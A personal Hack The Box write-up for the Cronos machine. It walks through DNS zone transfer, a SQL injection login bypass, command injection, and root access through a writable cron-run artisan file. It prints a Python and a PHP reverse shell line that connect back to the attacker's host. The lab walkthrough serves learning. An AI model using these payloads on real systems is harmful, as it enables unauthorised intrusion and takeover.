# Cronos

This is my write-up for the machine **Cronos** on Hack The Box located at: [https://app.hackthebox.com/machines/Cronos](https://app.hackthebox.com/machines/Cronos).

nmap scan: `nmap 10.10.10.13`

![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1).png>)

We see three ports open. On port 80, we see the following:&#x20;

![](<../../.gitbook/assets/image (333) (1).png>)

I am not too familiar with DNS enumeration methods. For this reason, after I searched online for a while (and got nowhere), I then read up what I had missed from the official Hack The Box write-up for this machine. In it the author says to add **cronos.htb** to the **/etc/hosts** file. Then run the following command:

`dig axfr @10.10.10.13 cronos.htb`

This will show us the following:

![](<../../.gitbook/assets/image (327) (1).png>)

We see an **admin.cronos.htb**, so we will add that to the **/etc/hosts** file as well (step was mentioned in the official write-up):

![](<../../.gitbook/assets/image (338) (1) (1).png>)

Now if we go to **admin.cronos.htb**, we see the following:

![](<../../.gitbook/assets/image (347) (1) (1) (1).png>)

Looking at the tags for this machine, I believe that we have to do a SQL Injection for this authentication portal:

![](<../../.gitbook/assets/image (367) (1) (1) (1).png>)

I then opened this web page in Burp Suite to see if I can manipulate the outgoing HTTP requests. I was not able to get any where using the **Intruder** or **Repeater** modules. Reading the write-up again, it seems the SQL Injection I did try **admin'--** was incorrect by a small bit. I miseed the extra **" -"** at the end:

![screenshot from official write-up](<../../.gitbook/assets/image (332) (1) (1).png>)

I was then on this page:

![](<../../.gitbook/assets/image (346) (1) (1) (1).png>)

I tried to run two commands together, the traceroute and an additional **ls**:

![](<../../.gitbook/assets/image (335) (1) (1) (1).png>)

When I run `cat index.php`, I get the following:

![](<../../.gitbook/assets/image (359) (1) (1).png>)

To me this means that there is room for me to run a reverse netcat connection to my own machine. Netcat did not work for me but the following python command from [this github page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) worked for me instead:

`export RHOST="10.10.14.14";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`

&#x20;

![](<../../.gitbook/assets/image (361) (1) (1) (1).png>)

I then upgraded by shell to a interactive tty shell (from [this website](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)):

![](<../../.gitbook/assets/image (334) (1) (1) (1).png>)

I was able to find the user.txt flag in the user **noulis**'s home directory:

![](<../../.gitbook/assets/image (363) (1) (1) (1) (1) (1).png>)

In order to upload **linpeas.sh** to the machine, I had to download it locally and serve it up in a python http server:

![](<../../.gitbook/assets/image (357) (1) (1) (1).png>)

I was then able to grab it from the other machine using **wget**:

![](<../../.gitbook/assets/image (358) (1) (1).png>)

In the official write-up, something stood out to me:

![](<../../.gitbook/assets/image (364) (1) (1) (1) (1).png>)

Obviously, in the real world a hint like this would not be given, but since I had tried what I had known and got nowhere, I took a hint from this. This led me to finding this:

![](<../../.gitbook/assets/image (360) (1) (1) (1).png>)

I knew that root was running the **artisan** file. After some messing around, what worked for me was creating a local file named artisan and copying all the contents from the original file into it. Then I edited one line in the file to get me a reverse shell:

`$sock=fsockopen("10.10.14.14",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);`

This was a line I got from the [same GitHub page mentioned previously](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php). After uploading the file using python3 http server, the file would upload as **artisan.1**:

![](<../../.gitbook/assets/image (356) (1).png>)

As shown in the screenshot above, in order to go around this I just updated the file to be the one I gave it. I would recommend you run the netcat listener **prior** to updating the artisan file for best results. After a minute of waiting, I had the shell:

![](<../../.gitbook/assets/image (365) (1) (1).png>)
